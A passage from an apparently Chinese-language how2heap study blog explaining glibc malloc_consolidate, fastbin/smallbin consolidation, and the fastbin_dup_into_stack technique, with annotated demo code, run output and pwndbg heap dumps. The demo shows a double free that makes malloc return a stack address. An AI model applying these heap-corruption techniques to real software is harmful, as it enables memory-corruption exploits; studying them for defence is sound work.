class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs xl">   static void malloc_consolidate(mstate av)<br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  int             nextinuse;<br>  <span class="hljs-function"><span class="hljs-title">atomic_store_relaxed</span> (&amp;av-&gt;</span>have_fastchunks, <span class="hljs-literal">false</span>);<br>  unsorted_bin = unsorted_chunks(av);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">    then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">    placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">    reused anyway.</span><br><span class="hljs-comment">  */</span><br>  maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>  fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">do</span> &#123;<br>    p = atomic_exchange_acq (fb, NULL);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">do</span> &#123;<br>        &#123;<br>          unsigned int idx = fastbin_index (chunksize (p));<br>          <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>            malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>        &#125;<br>        check_inuse_chunk(av, p);<br>        <span class="hljs-function"><span class="hljs-title">nextp</span> = p-&gt;</span>fd;<br>        <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>        size = chunksize (p);<br>        nextchunk = chunk_at_offset(p, size);<br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>          prevsize = prev_size (p);<br>          size += prevsize;<br>          p = chunk_at_offset(p, -((long) prevsize));<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>            malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);<br>          unlink_chunk (av, p);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (nextchunk != av-&gt;</span>top) &#123;<br>          nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>          <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>            size += nextsize;<br>            unlink_chunk (av, nextchunk);<br>          &#125; <span class="hljs-keyword">else</span><br>            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>          <span class="hljs-function"><span class="hljs-title">first_unsorted</span> = unsorted_bin-&gt;</span>fd;<br>          <span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>fd = p;<br>          <span class="hljs-function"><span class="hljs-title">first_unsorted</span>-&gt;</span>bk = p;<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd_nextsize = NULL;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk_nextsize = NULL;<br>          &#125;<br>          set_head(p, size | PREV_INUSE);<br>          <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk = unsorted_bin;<br>          <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd = first_unsorted;<br>          set_foot(p, size);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          size += nextsize;<br>          set_head(p, size | PREV_INUSE);<br>          <span class="hljs-function"><span class="hljs-title">av</span>-&gt;</span>top = p;<br>        &#125;<br>      &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我做一个解释</p>
+<p>先确定堆是否被初始化了(也就是get_max_fast()函数),如果没有就初始化堆，然后退出函数</p>
+<p>从 fastbin 中获取一个空闲 chunk,尝试向后合并</p>
+<p>如果不能向后合并就尝试向前合并</p>
+<p>如果向前合并的时候与top_chunk相邻,就直接归到top_chunk中</p>
+<p>如果并不相邻就插入到unsorted bin,然后继续取fastbin chunk直到fastbin list为空结束</p>
+<p>本例中的触发代码为:</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/*<br>​     If this <span class="hljs-keyword">is</span> a large request, consolidate fastbins <span class="hljs-keyword">before</span> continuing.<br>​     While <span class="hljs-keyword">it</span> might look excessive <span class="hljs-keyword">to</span> kill all fastbins <span class="hljs-keyword">before</span><br>​     even seeing <span class="hljs-keyword">if</span> there <span class="hljs-keyword">is</span> <span class="hljs-literal">space</span> available, this avoids<br>​     fragmentation problems normally associated <span class="hljs-keyword">with</span> fastbins.<br>​     Also, <span class="hljs-keyword">in</span> practice, programs tend <span class="hljs-keyword">to</span> have runs <span class="hljs-keyword">of</span> either small <span class="hljs-keyword">or</span><br>​     large requests, <span class="hljs-keyword">but</span> less often mixtures, so consolidation <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span><br>​     invoked all <span class="hljs-keyword">that</span> often <span class="hljs-keyword">in</span> most programs. And <span class="hljs-keyword">the</span> programs <span class="hljs-keyword">that</span><br>​     <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> called frequently <span class="hljs-keyword">in</span> otherwise tend <span class="hljs-keyword">to</span> fragment.<br>   */<br><br>  <span class="hljs-keyword">else</span><br>​    &#123;<br>​      idx = largebin_index (nb);<br>​      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>​        malloc_consolidate (av);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<ol start="2">
+<li>说好的unsorted bin呢????</li>
+</ol>
+<p>这还是得从glibc的实现说起,为什么调试的时候我们的chunk并不在unsorted bin中而是在small bin中呢?</p>
+<p>对glibc不太熟悉的同学可以先看下我之前的文章<a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">glibc内存管理机制</a></p>
+<p>这部分可以在我的文章中搜索large bin直接到第8个地方,不想跳转的同学我这里也做一下简短的解释</p>
+<p>我们在分配largebin时,ptmalloc会先遍历一下fastbin,将相邻的 chunk 进行合并，并链接到 unsorted bin 中然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只 有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大 小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 small bins 或是 large bins 中</p>
+<p>这就是为什么不在unsorted bin而在small bin中的原因了</p>
+<p>下面就是一点点的拓展</p>
+<p>然后如果连large bin中都没有合适的,那就只能从top chunk中分割出一部分了,如果连top chunk也不满足,那就会mmap或brk一块内存增加top chunk的大小</p>
+<h3 id="part-3"><a href="#part-3" class="headerlink" title="part 3"></a>part 3</h3><p>之后我们继续调试,我们现在第二次free p1,此时的堆结构</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1041</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6024b0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133969</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span>x50 [corrupted]<br><span class="hljs-params">FD:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-params">BK:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bb8 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span>) ◂— <span class="hljs-number">0</span>x602000<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>这里就可以看到他既在smallbins中又在fastbin中了,这又是为什么呢?</p>
+<p>因为再free的时候ptmalloc会发现fastbin是空的,因此就把他扔到fastbin中去了</p>
+<p>此时就可以分配两次p1了,一次系统会在fastbin中取出(优先查看fastbin),第二次就会在smallbins中取出:)</p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了两个fastbin chunk(0x40),然后free掉第一个chunk</p>
+<p>这里为啥不free第二个呢,因为如果free第二个的话就会和top chunk相邻了,此时会触发top chunk的合并</p>
+<p>之后程序调用了malloc函数malloc了一个large bin,触发了malloc_consoldate()函数,导致我们free掉的chunk1被放入了small bin中</p>
+<p>然后程序第二次free chunk1,ptmalloc会先看fastbin中有没有,发现没有,于是就把chunk1放到fast bin中了,这时chunk1就在fastbin和smallbin中各有一个</p>
+<p>此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户</p>
+<p>我们就有了两个拥有同样内存的chunk</p>
+<h1 id="0x04-fastbin-dup-into-stack"><a href="#0x04-fastbin-dup-into-stack" class="headerlink" title="0x04 fastbin_dup_into_stack"></a>0x04 fastbin_dup_into_stack</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><p>这里我也加了一点点小翻译:)</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//这个程序就是fast_dup.c的2.0版本,作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br>               <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br>        <span class="hljs-comment">//我们控制分配的地址就是这个栈上变量的地方</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>        <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br><br>        <span class="hljs-comment">//这里还是一样的,不能连续释放同一个chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>        <span class="hljs-comment">// free(a);</span><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>        <span class="hljs-built_in">free</span>(b);<br><br>        <span class="hljs-comment">//这里再次,释放a,double free</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>        <span class="hljs-built_in">free</span>(a);<br><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br>                <span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br>        <span class="hljs-comment">//现在第一次分配内存,取出chunk a 赋给chunk d</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-comment">//现在分配两次内存,取出chunk a,chunk b</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>        <span class="hljs-comment">//现在free list就只剩下一个chunk a了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br><br>        <span class="hljs-comment">//现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br>                <span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br>                <span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br>                <span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br>        stack_var = <span class="hljs-number">0x20</span>;<br>        <br>        <span class="hljs-comment">//现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br>        *d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-built_in">sizeof</span>(d));<br><br>        <span class="hljs-comment">//这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-built_in">file</span> extends <span class="hljs-keyword">on</span> fastbin_dup.c <span class="hljs-keyword">by</span> tricking malloc <span class="hljs-keyword">into</span><br><span class="hljs-keyword">returning</span> a pointer <span class="hljs-keyword">to</span> a controlled location (<span class="hljs-keyword">in</span> this case, <span class="hljs-keyword">the</span> stack).<br>The address we want malloc() <span class="hljs-keyword">to</span> <span class="hljs-literal">return</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x7ffe5c42b638</span>.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632030</span><br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632050</span><br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>If we free <span class="hljs-number">0x632010</span> again, things will crash because <span class="hljs-number">0x632010</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> top <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll free <span class="hljs-number">0x632030</span>.<br>Now, we can free <span class="hljs-number">0x632010</span> again, <span class="hljs-keyword">since</span> <span class="hljs-keyword">it</span>&#x27;s <span class="hljs-keyword">not</span> <span class="hljs-keyword">the</span> head <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>Now <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span> has [ <span class="hljs-number">0x632010</span>, <span class="hljs-number">0x632030</span>, <span class="hljs-number">0x632010</span> ]. We&#x27;ll now carry out our attack <span class="hljs-keyword">by</span> modifying data <span class="hljs-keyword">at</span> <span class="hljs-number">0x632010</span>.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632030</span><br>Now <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span> has [ <span class="hljs-number">0x632010</span> ].<br>Now, we have access <span class="hljs-keyword">to</span> <span class="hljs-number">0x632010</span> <span class="hljs-keyword">while</span> <span class="hljs-keyword">it</span> remains <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> head <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>so now we are writing a fake free size (<span class="hljs-keyword">in</span> this case, <span class="hljs-number">0x20</span>) <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> stack,<br>so <span class="hljs-keyword">that</span> malloc will think there <span class="hljs-keyword">is</span> a free chunk there <span class="hljs-keyword">and</span> agree <span class="hljs-keyword">to</span><br><span class="hljs-built_in">return</span> a pointer <span class="hljs-keyword">to</span> <span class="hljs-keyword">it</span>.<br>Now, we overwrite <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-number">8</span> bytes <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> data <span class="hljs-keyword">at</span> <span class="hljs-number">0x632010</span> <span class="hljs-keyword">to</span> point right <span class="hljs-keyword">before</span> <span class="hljs-keyword">the</span> <span class="hljs-number">0x20</span>.<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span>, putting <span class="hljs-keyword">the</span> stack address <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span><br><span class="hljs-number">4</span>th malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x7ffe5c42b638</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="关键部分调试-3"><a href="#关键部分调试-3" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>本次程序我在第41行,也就是给stack赋值之前的地方,第49行即给d赋值后,最后一个是在52行即最后的地方下断点</p>
+<p>此时运行程序,我们看一下堆:</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x603020,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21<br>&#125;<br><span class="hljs-number">0</span>x603020 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span 